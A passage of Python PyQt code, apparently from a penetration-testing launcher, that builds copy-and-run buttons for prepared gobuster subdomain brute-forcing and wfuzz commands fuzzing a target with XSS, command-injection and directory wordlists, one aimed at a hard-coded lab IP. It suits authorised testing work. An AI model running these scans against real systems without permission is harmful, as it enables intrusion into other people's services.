        self.gobusterFiles_Scan1_Run.clicked.connect(lambda: subprocess.Popen(["/usr/bin/terminator", "--new-tab", "-e", command10]))
        self.gobusterFiles_Scan1_Run.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        )

        # gobusterFiles_Scan1 adding widgets
        label_layout = QHBoxLayout()
        label_layout.addWidget(self.gobusterFiles_Scan1_Copy)
        label_layout.addWidget(self.gobusterFiles_Scan1_Run)
        label_layout.addWidget(self.gobusterFiles_Scan1)
        self.tab2_container_layout.insertLayout(33, label_layout)
        self.tab2_container_layout.addStretch()

        # gobusterFiles_spacer1
        if hasattr(self, 'gobusterFiles_spacer1'):
            self.tab2_container_layout.removeWidget(self.gobusterFiles_spacer1)
            self.gobusterFiles_spacer1.deleteLater()
        self.gobusterFiles_spacer1 = QLabel()
        self.gobusterFiles_spacer1.setFixedWidth(40)
        self.gobusterFiles_spacer1.setFixedHeight(20)

        # gobusterFiles_spacer & divider layout
        self.tab2_container_layout.insertWidget(34, self.gobusterFiles_spacer1)

# gobusterSub
        if hasattr(self, 'gobusterSub'):
            self.tab2_container_layout.removeWidget(self.gobusterSub)
            self.gobusterSub.deleteLater()
        self.gobusterSub = QLabel("[+ Gobuster for SubDomain Brute Forcing]")
        self.gobusterSub.setStyleSheet(
            "color: #20C20E;" +
            "font-size: 20px;" +
            "font-style: 'bold';"
        )
        self.tab2_container_layout.insertWidget(35,self.gobusterSub)

        # gobusterSub_Scan1
        if hasattr(self, 'gobusterSub_Scan1'):
            self.tab2_container_layout.removeWidget(self.gobusterSub_Scan1)
            self.gobusterSub_Scan1.deleteLater()
        self.gobusterSub_Scan1 = QLabel(f"gobuster dns -d domain.org -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -t 30")
        self.gobusterSub_Scan1.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';"
            )

        # gobusterSub_Scan1 copy button
        if hasattr(self, 'gobusterSub_Scan1_Copy'):
            self.tab2_container_layout.removeWidget(self.gobusterSub_Scan1_Copy)
            self.gobusterSub_Scan1_Copy.deleteLater()
        self.gobusterSub_Scan1_Copy = QPushButton()
        self.gobusterSub_Scan1_Copy.setIcon(QIcon.fromTheme("edit-copy"))
        self.gobusterSub_Scan1_Copy.setFixedSize(QSize(20,20))
        self.gobusterSub_Scan1_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.gobusterSub_Scan1.text()))
        self.gobusterSub_Scan1_Copy.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        )

        # gobusterSub_Scan1 run button
        if hasattr(self, 'gobusterSub_Scan1_Run'):
            self.tab2_container_layout.removeWidget(self.gobusterSub_Scan1_Run)
            self.gobusterSub_Scan1_Run.deleteLater()
        self.gobusterSub_Scan1_Run = QPushButton()
        self.gobusterSub_Scan1_Run.setIcon(QIcon.fromTheme("media-playback-start"))
        self.gobusterSub_Scan1_Run.setFixedSize(QSize(20,20))
        command10 = self.gobusterSub_Scan1.text() + "; bash"
        self.gobusterSub_Scan1_Run.clicked.connect(lambda: subprocess.Popen(["/usr/bin/terminator", "--new-tab", "-e", command10]))
        self.gobusterSub_Scan1_Run.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        )

        # gobusterSub_Scan1 adding widgets
        label_layout = QHBoxLayout()
        label_layout.addWidget(self.gobusterSub_Scan1_Copy)
        label_layout.addWidget(self.gobusterSub_Scan1_Run)
        label_layout.addWidget(self.gobusterSub_Scan1)
        self.tab2_container_layout.insertLayout(36, label_layout)
        self.tab2_container_layout.addStretch()

        # gobuster_divider1 
        if hasattr(self, 'gobuster_divider1'):
            self.tab2_container_layout.removeWidget(self.gobuster_divider1)
            self.gobuster_divider1.deleteLater()
        self.gobuster_divider1 = QFrame()
        self.gobuster_divider1.setFrameShape(QFrame.HLine)
        self.gobuster_divider1.setLineWidth(3)
        self.gobuster_divider1.setStyleSheet("color: #20C20E;")
        
        # gobuster_divider2
        if hasattr(self, 'gobuster_divider2'):
            self.tab2_container_layout.removeWidget(self.gobuster_divider2)
            self.gobuster_divider2.deleteLater()
        self.gobuster_divider2 = QFrame()
        self.gobuster_divider2.setFrameShape(QFrame.HLine)
        self.gobuster_divider2.setLineWidth(3)
        self.gobuster_divider2.setStyleSheet("color: #20C20E;")
        
        # gobuster_spacer1
        if hasattr(self, 'gobuster_spacer1'):
            self.tab2_container_layout.removeWidget(self.gobuster_spacer1)
            self.gobuster_spacer1.deleteLater()
        self.gobuster_spacer1 = QLabel()
        self.gobuster_spacer1.setFixedWidth(40)
        self.gobuster_spacer1.setFixedHeight(50)
        
        # gobuster_spacer2
        if hasattr(self, 'gobuster_spacer2'):
            self.tab2_container_layout.removeWidget(self.gobuster_spacer2)
            self.gobuster_spacer2.deleteLater()
        self.gobuster_spacer2 = QLabel()
        self.gobuster_spacer2.setFixedWidth(40)
        self.gobuster_spacer2.setFixedHeight(50)

        # gobuster_spacer & divider layout
        self.tab2_container_layout.insertWidget(37, self.gobuster_spacer1)
        self.tab2_container_layout.insertWidget(38, self.gobuster_divider1)
        self.tab2_container_layout.insertWidget(39, self.gobuster_divider2)
        self.tab2_container_layout.insertWidget(40, self.gobuster_spacer2)
        self.tab2_container_layout.addStretch()

        # wfuzzXSS
        if hasattr(self, 'wfuzzXSS'):
            self.tab2_container_layout.removeWidget(self.wfuzzXSS)
            self.wfuzzXSS.deleteLater()
        self.wfuzzXSS = QLabel("[+ Wfuzz XSS Fuzzing]")
        self.wfuzzXSS.setStyleSheet(
            "color: #20C20E;" +
            "font-size: 20px;" +
            "font-style: 'bold';"
        )
        self.tab2_container_layout.insertWidget(41,self.wfuzzXSS)

        # wfuzzXSS_Scan1
        if hasattr(self, 'wfuzzXSS_Scan1'):
            self.tab2_container_layout.removeWidget(self.wfuzzXSS_Scan1)
            self.wfuzzXSS_Scan1.deleteLater()
        self.wfuzzXSS_Scan1 = QLabel(f"wfuzz -c -z file,/usr/share/seclists/Fuzzing/XSS/XSS-BruteLogic.txt http://{self.rhost}:{self.rport}/FUZZ")
        self.wfuzzXSS_Scan1.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';" 
            )

        # wfuzzXSS_Scan1 copy button
        if hasattr(self, 'wfuzzXSS_Scan1_Copy'):
            self.tab2_container_layout.removeWidget(self.wfuzzXSS_Scan1_Copy)
            self.wfuzzXSS_Scan1_Copy.deleteLater()
        self.wfuzzXSS_Scan1_Copy = QPushButton()
        self.wfuzzXSS_Scan1_Copy.setIcon(QIcon.fromTheme("edit-copy"))
        self.wfuzzXSS_Scan1_Copy.setFixedSize(QSize(20,20))
        self.wfuzzXSS_Scan1_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.wfuzzXSS_Scan1.text()))
        self.wfuzzXSS_Scan1_Copy.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        )

        # wfuzzXSS_Scan1 run button
        if hasattr(self, 'wfuzzXSS_Scan1_Run'):
            self.tab2_container_layout.removeWidget(self.wfuzzXSS_Scan1_Run)
            self.wfuzzXSS_Scan1_Run.deleteLater()
        self.wfuzzXSS_Scan1_Run = QPushButton()
        self.wfuzzXSS_Scan1_Run.setIcon(QIcon.fromTheme("media-playback-start"))
        self.wfuzzXSS_Scan1_Run.setFixedSize(QSize(20,20))
        command10 = self.wfuzzXSS_Scan1.text() + "; bash"
        self.wfuzzXSS_Scan1_Run.clicked.connect(lambda: subprocess.Popen(["/usr/bin/terminator", "--new-tab", "-e", command10]))
        self.wfuzzXSS_Scan1_Run.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        )

        # wfuzzXSS_Scan1 adding widgets
        label_layout = QHBoxLayout()
        label_layout.addWidget(self.wfuzzXSS_Scan1_Copy)
        label_layout.addWidget(self.wfuzzXSS_Scan1_Run)
        label_layout.addWidget(self.wfuzzXSS_Scan1)
        self.tab2_container_layout.insertLayout(42, label_layout)
        self.tab2_container_layout.addStretch()

        # wfuzzXSS_Scan2
        if hasattr(self, 'wfuzzXSS_Scan2'):
            self.tab2_container_layout.removeWidget(self.wfuzzXSS_Scan2)
            self.wfuzzXSS_Scan2.deleteLater()
        self.wfuzzXSS_Scan2 = QLabel(f"wfuzz -c -z file,/usr/share/seclists/Fuzzing/XSS/XSS-Jhaddix.txt http://10.11.1.71:80/FUZZ")
        self.wfuzzXSS_Scan2.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';" 
            )

        # wfuzzXSS_Scan2 copy button
        if hasattr(self, 'wfuzzXSS_Scan2_Copy'):
            self.tab2_container_layout.removeWidget(self.wfuzzXSS_Scan2_Copy)
            self.wfuzzXSS_Scan2_Copy.deleteLater()
        self.wfuzzXSS_Scan2_Copy = QPushButton()
        self.wfuzzXSS_Scan2_Copy.setIcon(QIcon.fromTheme("edit-copy"))
        self.wfuzzXSS_Scan2_Copy.setFixedSize(QSize(20,20))
        self.wfuzzXSS_Scan2_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.wfuzzXSS_Scan2.text()))
        self.wfuzzXSS_Scan2_Copy.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        )

        # wfuzzXSS_Scan2 run button
        if hasattr(self, 'wfuzzXSS_Scan2_Run'):
            self.tab2_container_layout.removeWidget(self.wfuzzXSS_Scan2_Run)
            self.wfuzzXSS_Scan2_Run.deleteLater()
        self.wfuzzXSS_Scan2_Run = QPushButton()
        self.wfuzzXSS_Scan2_Run.setIcon(QIcon.fromTheme("media-playback-start"))
        self.wfuzzXSS_Scan2_Run.setFixedSize(QSize(20,20))
        command10 = self.wfuzzXSS_Scan2.text() + "; bash"
        self.wfuzzXSS_Scan2_Run.clicked.connect(lambda: subprocess.Popen(["/usr/bin/terminator", "--new-tab", "-e", command10]))
        self.wfuzzXSS_Scan2_Run.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        )

        # wfuzzXSS_Scan2 adding widgets
        label_layout = QHBoxLayout()
        label_layout.addWidget(self.wfuzzXSS_Scan2_Copy)
        label_layout.addWidget(self.wfuzzXSS_Scan2_Run)
        label_layout.addWidget(self.wfuzzXSS_Scan2)
        self.tab2_container_layout.insertLayout(43, label_layout)
        self.tab2_container_layout.addStretch()

        # wfuzzXSS_spacer1
        if hasattr(self, 'wfuzzXSS_spacer1'):
            self.tab2_container_layout.removeWidget(self.wfuzzXSS_spacer1)
            self.wfuzzXSS_spacer1.deleteLater()
        self.wfuzzXSS_spacer1 = QLabel()
        self.wfuzzXSS_spacer1.setFixedWidth(40)
        self.wfuzzXSS_spacer1.setFixedHeight(20)

        # wfuzzXSS_spacer & divider layout
        self.tab2_container_layout.insertWidget(44, self.wfuzzXSS_spacer1)

# wfuzzCIPD
        if hasattr(self, 'wfuzzCIPD'):
            self.tab2_container_layout.removeWidget(self.wfuzzCIPD)
            self.wfuzzCIPD.deleteLater()
        self.wfuzzCIPD = QLabel("[+ Wfuzz Command Injection with Post Data]")
        self.wfuzzCIPD.setStyleSheet(
            "color: #20C20E;" +
            "font-size: 20px;" +
            "font-style: 'bold';"
        )
        self.tab2_container_layout.insertWidget(45,self.wfuzzCIPD)

        # wfuzzCIPD_Scan1
        if hasattr(self, 'wfuzzCIPD_Scan1'):
            self.tab2_container_layout.removeWidget(self.wfuzzCIPD_Scan1)
            self.wfuzzCIPD_Scan1.deleteLater()
        self.wfuzzCIPD_Scan1 = QLabel(f"wfuzz -c -z file,/usr/share/seclists/Fuzzing/command-injection-commix.txt -d doi=FUZZ http://{self.rhost}:{self.rport}/FUZZ")
        self.wfuzzCIPD_Scan1.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';" 
            )

        # wfuzzCIPD_Scan1 copy button
        if hasattr(self, 'wfuzzCIPD_Scan1_Copy'):
            self.tab2_container_layout.removeWidget(self.wfuzzCIPD_Scan1_Copy)
            self.wfuzzCIPD_Scan1_Copy.deleteLater()
        self.wfuzzCIPD_Scan1_Copy = QPushButton()
        self.wfuzzCIPD_Scan1_Copy.setIcon(QIcon.fromTheme("edit-copy"))
        self.wfuzzCIPD_Scan1_Copy.setFixedSize(QSize(20,20))
        self.wfuzzCIPD_Scan1_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.wfuzzCIPD_Scan1.text()))
        self.wfuzzCIPD_Scan1_Copy.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        )

        # wfuzzCIPD_Scan1 run button
        if hasattr(self, 'wfuzzCIPD_Scan1_Run'):
            self.tab2_container_layout.removeWidget(self.wfuzzCIPD_Scan1_Run)
            self.wfuzzCIPD_Scan1_Run.deleteLater()
        self.wfuzzCIPD_Scan1_Run = QPushButton()
        self.wfuzzCIPD_Scan1_Run.setIcon(QIcon.fromTheme("media-playback-start"))
        self.wfuzzCIPD_Scan1_Run.setFixedSize(QSize(20,20))
        command10 = self.wfuzzCIPD_Scan1.text() + "; bash"
        self.wfuzzCIPD_Scan1_Run.clicked.connect(lambda: subprocess.Popen(["/usr/bin/terminator", "--new-tab", "-e", command10]))
        self.wfuzzCIPD_Scan1_Run.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        )

        # wfuzzCIPD_Scan1 adding widgets
        label_layout = QHBoxLayout()
        label_layout.addWidget(self.wfuzzCIPD_Scan1_Copy)
        label_layout.addWidget(self.wfuzzCIPD_Scan1_Run)
        label_layout.addWidget(self.wfuzzCIPD_Scan1)
        self.tab2_container_layout.insertLayout(46, label_layout)
        self.tab2_container_layout.addStretch()

        # wfuzzCIPD_spacer1
        if hasattr(self, 'wfuzzCIPD_spacer1'):
            self.tab2_container_layout.removeWidget(self.wfuzzCIPD_spacer1)
            self.wfuzzCIPD_spacer1.deleteLater()
        self.wfuzzCIPD_spacer1 = QLabel()
        self.wfuzzCIPD_spacer1.setFixedWidth(40)
        self.wfuzzCIPD_spacer1.setFixedHeight(20)

        # wfuzzCIPD_spacer & divider layout
        self.tab2_container_layout.insertWidget(47, self.wfuzzCIPD_spacer1)

# wfuzzPE
        if hasattr(self, 'wfuzzPE'):
            self.tab2_container_layout.removeWidget(self.wfuzzPE)
            self.wfuzzPE.deleteLater()
        self.wfuzzPE = QLabel("[+ Wfuzz Testing for Parameter Existence]")
        self.wfuzzPE.setStyleSheet(
            "color: #20C20E;" +
            "font-size: 20px;" +
            "font-style: 'bold';"
        )
        self.tab2_container_layout.insertWidget(48,self.wfuzzPE)

        # wfuzzPE_Scan1
        if hasattr(self, 'wfuzzPE_Scan1'):
            self.tab2_container_layout.removeWidget(self.wfuzzPE_Scan1)
            self.wfuzzPE_Scan1.deleteLater()
        self.wfuzzPE_Scan1 = QLabel(f"wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt http://{self.rhost}:{self.rport}/FUZZ")
        self.wfuzzPE_Scan1.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';" 
            )

        # wfuzzPE_Scan1 copy button
        if hasattr(self, 'wfuzzPE_Scan1_Copy'):
            self.tab2_container_layout.removeWidget(self.wfuzzPE_Scan1_Copy)
            self.wfuzzPE_Scan1_Copy.deleteLater()
        self.wfuzzPE_Scan1_Copy = QPushButton()
        self.wfuzzPE_Scan1_Copy.setIcon(QIcon.fromTheme("edit-copy"))
        self.wfuzzPE_Scan1_Copy.setFixedSize(QSize(20,20))
        self.wfuzzPE_Scan1_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.wfuzzPE_Scan1.text()))
        self.wfuzzPE_Scan1_Copy.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        )

        # wfuzzPE_Scan1 run button
        if hasattr(self, 'wfuzzPE_Scan1_Run'):
            self.tab2_container_layout.removeWidget(self.wfuzzPE_Scan1_Run)
            self.wfuzzPE_Scan1_Run.deleteLater()
        self.wfuzzPE_Scan1_Run = QPushButton()
        self.wfuzzPE_Scan1_Run.setIcon(QIcon.fromTheme("media-playback-start"))
        self.wfuzzPE_Scan1_Run.setFixedSize(QSize(20,20))
        command10 = self.wfuzzPE_Scan1.text() + "; bash"
        self.wfuzzPE_Scan1_Run.clicked.connect(lambda: subprocess.Popen(["/usr/bin/terminator", "--new-tab", "-e", command10]))
        self.wfuzzPE_Scan1_Run.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        )

        # wfuzzPE_Scan1 adding widgets
        label_layout = QHBoxLayout()
        label_layout.addWidget(self.wfuzzPE_Scan1_Copy)
        label_layout.addWidget(self.wfuzzPE_Scan1_Run)
        label_layout.addWidget(self.wfuzzPE_Scan1)
        self.tab2_container_layout.insertLayout(49, label_layout)
        self.tab2_container_layout.addStretch()

        # wfuzzPE_spacer1
        if hasattr(self, 'wfuzzPE_spacer1'):
            self.tab2_container_layout.removeWidget(self.wfuzzPE_spacer1)
            self.wfuzzPE_spacer1.deleteLater()
        self.wfuzzPE_spacer1 = QLabel()
        self.wfuzzPE_spacer1.setFixedWidth(40)
        self.wfuzzPE_spacer1.setFixedHeight(20)

        # wfuzzPE_spacer & divider layout
        self.tab2_container_layout.insertWidget(50, self.wfuzzPE_spacer1)

# wfuzzAFD
        if hasattr(self, 'wfuzzAFD'):
            self.tab2_container_layout.removeWidget(self.wfuzzAFD)
            self.wfuzzAFD.deleteLater()
        self.wfuzzAFD = QLabel("[+ Wfuzz Authenticated Fuzzing Directories]")
        self.wfuzzAFD.setStyleSheet(
            "color: #20C20E;" +
            "font-size: 20px;" +
            "font-style: 'bold';"
        )
        self.tab2_container_layout.insertWidget(51,self.wfuzzAFD)

        # wfuzzAFD_Scan1
        if hasattr(self, 'wfuzzAFD_Scan1'):
            self.tab2_container_layout.removeWidget(self.wfuzzAFD_Scan1)
            self.wfuzzAFD_Scan1.deleteLater()
        self.wfuzzAFD_Scan1 = QLabel(f"wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -hc 404 -d \"SESSIONID=value\" \"http://{self.rhost}:{self.rport}/FUZZ/\"")
        self.wfuzzAFD_Scan1.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';" 
            )

        # wfuzzAFD_Scan1 copy button
        if hasattr(self, 'wfuzzAFD_Scan1_Copy'):
            self.tab2_container_layout.removeWidget(self.wfuzzAFD_Scan1_Copy)
            self.wfuzzAFD_Scan1_Copy.deleteLater()
        self.wfuzzAFD_Scan1_Copy = QPushButton()
        self.wfuzzAFD_Scan1_Copy.setIcon(QIcon.fromTheme("edit-copy"))
        self.wfuzzAFD_Scan1_Copy.setFixedSize(QSize(20,20))
        self.wfuzzAFD_Scan1_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.wfuzzAFD_Scan1.text()))
        self.wfuzzAFD_Scan1_Copy.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        )

        # wfuzzAFD_Scan1 run button
        if hasattr(self, 'wfuzzAFD_Scan1_Run'):
            self.tab2_container_layout.removeWidget(self.wfuzzAFD_Scan1_Run)
            self.wfuzzAFD_Scan1_Run.deleteLater()
        self.wfuzzAFD_Scan1_Run = QPushButton()
        self.wfuzzAFD_Scan1_Run.setIcon(QIcon.fromTheme("media-playback-start"))
        self.wfuzzAFD_Scan1_Run.setFixedSize(QSize(20,20))
        command10 = self.wfuzzAFD_Scan1.text() + "; bash"
        self.wfuzzAFD_Scan1_Run.clicked.connect(lambda: subprocess.Popen(["/usr/bin/terminator", "--new-tab", "-e", command10]))
        self.wfuzzAFD_Scan1_Run.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        )

        # wfuzzAFD_Scan1 adding widgets
        label_layout = QHBoxLayout()
        label_layout.addWidget(self.wfuzzAFD_Scan1_Copy)
        label_layout.addWidget(self.wfuzzAFD_Scan1_Run)
        label_layout.addWidget(self.wfuzzAFD_Scan1)
        self.tab2_container_layout.insertLayout(52, label_layout)
        self.tab2_container_layout.addStretch()

        # wfuzzAFD_spacer1
        if hasattr(self, 'wfuzzAFD_spacer1'):
            self.tab2_container_layout.removeWidget(self.wfuzzAFD_spacer1)
            self.wfuzzAFD_spacer1.deleteLater()
        self.wfuzzAFD_spacer1 = QLabel()
        self.wfuzzAFD_spacer1.setFixedWidth(40)
        self.wfuzzAFD_spacer1.setFixedHeight(20)

        # wfuzzAFD_spacer & divider layout
        self.tab2_container_layout.insertWidget(53, self.wfuzzAFD_spacer1)

# wfuzzAFF
        if hasattr(self, 'wfuzzAFF'):
            self.tab2_container_layout.removeWidget(self.wfuzzAFF)
            self.wfuzzAFF.deleteLater()
        self.wfuzzAFF = QLabel("[+ Authenticated File Fuzzing]")
        self.wfuzzAFF.setStyleSheet(
            "color: #20C20E;" +
            "font-size: 20px;" +
            "font-style: 'bold';"
        )
        self.tab2_container_layout.insertWidget(54,self.wfuzzAFF)

        # wfuzzAFF_Scan1
        if hasattr(self, 'wfuzzAFF_Scan1'):
            self.tab2_container_layout.removeWidget(self.wfuzzAFF_Scan1)
            self.wfuzzAFF_Scan1.deleteLater()
        self.wfuzzAFF_Scan1 = QLabel(f"wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt -hc 404 -d \"SESSIONID=value\" \"http://{self.rhost}:{self.rport}/FUZZ\"")
        self.wfuzzAFF_Scan1.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';" 
            )

        # wfuzzAFF_Scan1 copy button
        if hasattr(self, 'wfuzzAFF_Scan1_Copy'):
            self.tab2_container_layout.removeWidget(self.wfuzzAFF_Scan1_Copy)
            self.wfuzzAFF_Scan1_Copy.deleteLater()
        self.wfuzzAFF_Scan1_Copy = QPushButton()
        self.wfuzzAFF_Scan1_Copy.setIcon(QIcon.fromTheme("edit-copy"))
        self.wfuzzAFF_Scan1_Copy.setFixedSize(QSize(20,20))
        self.wfuzzAFF_Scan1_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.wfuzzAFF_Scan1.text()))
        self.wfuzzAFF_Scan1_Copy.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        )

        # wfuzzAFF_Scan1 run button
        if hasattr(self, 'wfuzzAFF_Scan1_Run'):
            self.tab2_container_layout.removeWidget(self.wfuzzAFF_Scan1_Run)
            self.wfuzzAFF_Scan1_Run.deleteLater()
        self.wfuzzAFF_Scan1_Run = QPushButton()
        self.wfuzzAFF_Scan1_Run.setIcon(QIcon.fromTheme("media-playback-start"))
        self.wfuzzAFF_Scan1_Run.setFixedSize(QSize(20,20))
        command10 = self.wfuzzAFF_Scan1.text() + "; bash"
        self.wfuzzAFF_Scan1_Run.clicked.connect(lambda: subprocess.Popen(["/usr/bin/terminator", "--new-tab", "-e", command10]))
        self.wfuzzAFF_Scan1_Run.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        )

        # wfuzzAFF_Scan1 adding widgets
        label_layout = QHBoxLayout()
        label_layout.addWidget(self.wfuzzAFF_Scan1_Copy)
        label_layout.addWidget(self.wfuzzAFF_Scan1_Run)
        label_layout.addWidget(self.wfuzzAFF_Scan1)
        self.tab2_container_layout.insertLayout(55, label_layout)
        self.tab2_container_layout.addStretch()

        # wfuzzAFF_spacer1
        if hasattr(self, 'wfuzzAFF_spacer1'):
            self.tab2_container_layout.removeWidget(self.wfuzzAFF_spacer1)
            self.wfuzzAFF_spacer1.deleteLater()
        self.wfuzzAFF_spacer1 = QLabel()
        self.wfuzzAFF_spacer1.setFixedWidth(40)
        self.wfuzzAFF_spacer1.setFixedHeight(20)

        # wfuzzAFF_spacer & divider layout
        self.tab2_container_layout.insertWidget(56, self.wfuzzAFF_spacer1)

# wfuzzD
        if hasattr(self, 'wfuzzD'):
            self.tab2_container_layout.removeWidget(self.wfuzzD)
            self.wfuzzD.deleteLater()
        self.wfuzzD = QLabel("[+ Wfuzz Fuzz Directories]")
        self.wfuzzD.setStyleSheet(
            "color: #20C20E;" +
            "font-size: 20px;" +
            "font-style: 'bold';"
        )
        self.tab2_container_layout.insertWidget(57,self.wfuzzD)

        # wfuzzD_Scan1
        if hasattr(self, 'wfuzzD_Scan1'):
            self.tab2_container_layout.removeWidget(self.wfuzzD_Scan1)
            self.wfuzzD_Scan1.deleteLater()
        self.wfuzzD_Scan1 = QLabel(f"wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt --hc 404 \"http://{self.rhost}:{self.rport}/FUZZ/\"")
        self.wfuzzD_Scan1.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';" 
            )

        # wfuzzD_Scan1 copy button
        if hasattr(self, 'wfuzzD_Scan1_Copy'):
            self.tab2_container_layout.removeWidget(self.wfuzzD_Scan1_Copy)
            self.wfuzzD_Scan1_Copy.deleteLater()
        self.wfuzzD_Scan1_Copy = QPushButton()
        self.wfuzzD_Scan1_Copy.setIcon(QIcon.fromTheme("edit-copy"))
        self.wfuzzD_Scan1_Copy.setFixedSize(QSize(20,20))
        self.wfuzzD_Scan1_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.wfuzzD_Scan1.text()))
        self.wfuzzD_Scan1_Copy.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        )

        # wfuzzD_Scan1 run button
        if hasattr(self, 'wfuzzD_Scan1_Run'):
            self.tab2_container_layout.removeWidget(self.wfuzzD_Scan1_Run)
            self.wfuzzD_Scan1_Run.deleteLater()
        self.wfuzzD_Scan1_Run = QPushButton()
        self.wfuzzD_Scan1_Run.setIcon(QIcon.fromTheme("media-playback-start"))
        self.wfuzzD_Scan1_Run.setFixedSize(QSize(20,20))
        command10 = self.wfuzzD_Scan1.text() + "; bash"
        self.wfuzzD_Scan1_Run.clicked.connect(lambda: subprocess.Popen(["/usr/bin/terminator", "--new-tab", "-e", command10]))
        self.wfuzzD_Scan1_Run.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        )

        # wfuzzD_Scan1 adding widgets
        label_layout = QHBoxLayout()
        label_layout.addWidget(self.wfuzzD_Scan1_Copy)
        label_layout.addWidget(self.wfuzzD_Scan1_Run)
        label_layout.addWidget(self.wfuzzD_Scan1)
        self.tab2_container_layout.insertLayout(58, label_layout)
        self.tab2_container_layout.addStretch()

        # wfuzzD_Scan2
        if hasattr(self, 'wfuzzD_Scan2'):
            self.tab2_container_layout.removeWidget(self.wfuzzD_Scan2)
            self.wfuzzD_Scan2.deleteLater()
        self.wfuzzD_Scan2 = QLabel(f"wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt --hc 404 --hh 0 \"http://{self.rhost}:{self.rport}/FUZZ/\"")
        self.wfuzzD_Scan2.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';" 
            )

        # wfuzzD_Scan2 copy button
        if hasattr(self, 'wfuzzD_Scan2_Copy'):
            self.tab2_container_layout.removeWidget(self.wfuzzD_Scan2_Copy)
            self.wfuzzD_Scan2_Copy.deleteLater()
        self.wfuzzD_Scan2_Copy = QPushButton()
        self.wfuzzD_Scan2_Copy.setIcon(QIcon.fromTheme("edit-copy"))
        self.wfuzzD_Scan2_Copy.setFixedSize(QSize(20,20))
        self.wfuzzD_Scan2_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.wfuzzD_Scan2.text()))
        self.wfuzzD_Scan2_Copy.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        )

        # wfuzzD_Scan2 run button
        if hasattr(self, 'wfuzzD_Scan2_Run'):
            self.tab2_container_layout.removeWidget(self.wfuzzD_Scan2_Run)
            self.wfuzzD_Scan2_Run.deleteLater()
        self.wfuzzD_Scan2_Run = QPushButton()
        self.wfuzzD_Scan2_Run.setIcon(QIcon.fromTheme("media-playback-start"))
        self.wfuzzD_Scan2_Run.setFixedSize(QSize(20,20))
        command10 = self.wfuzzD_Scan2.text() + "; bash"
        self.wfuzzD_Scan2_Run.clicked.connect(lambda: subprocess.Popen(["/usr/bin/terminator", "--new-tab", "-e", command10]))
        self.wfuzzD_Scan2_Run.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        )

        # wfuzzD_Scan2 adding widgets
        label_layout = QHBoxLayout()
        label_layout.addWidget(self.wfuzzD_Scan2_Copy)
        label_layout.addWidget(self.wfuzzD_Scan2_Run)
        label_layout.addWidget(self.wfuzzD_Scan2)
        self.tab2_container_layout.insertLayout(59, label_layout)
        self.tab2_container_layout.addStretch()

        # wfuzzD_Scan3
        if hasattr(self, 'wfuzzD_Scan3'):
            self.tab2_container_layout.removeWidget(self.wfuzzD_Scan3)
            self.wfuzzD_Scan3.deleteLater()
        self.wfuzzD_Scan3 = QLabel(f"wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt --hc 404 \"http://{self.rhost}:{self.rport}/FUZZ/\"")
        self.wfuzzD_Scan3.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';" 
            )

        # wfuzzD_Scan3 copy button
        if hasattr(self, 'wfuzzD_Scan3_Copy'):
            self.tab2_container_layout.removeWidget(self.wfuzzD_Scan3_Copy)
            self.wfuzzD_Scan3_Copy.deleteLater()
        self.wfuzzD_Scan3_Copy = QPushButton()
        self.wfuzzD_Scan3_Copy.setIcon(QIcon.fromTheme("edit-copy"))
        self.wfuzzD_Scan3_Copy.setFixedSize(QSize(20,20))
        self.wfuzzD_Scan3_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.wfuzzD_Scan3.text()))
        self.wfuzzD_Scan3_Copy.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        )

        # wfuzzD_Scan3 run button
        if hasattr(self, 'wfuzzD_Scan3_Run'):
            self.tab2_container_layout.removeWidget(self.wfuzzD_Scan3_Run)
            self.wfuzzD_Scan3_Run.deleteLater()
        self.wfuzzD_Scan3_Run = QPushButton()
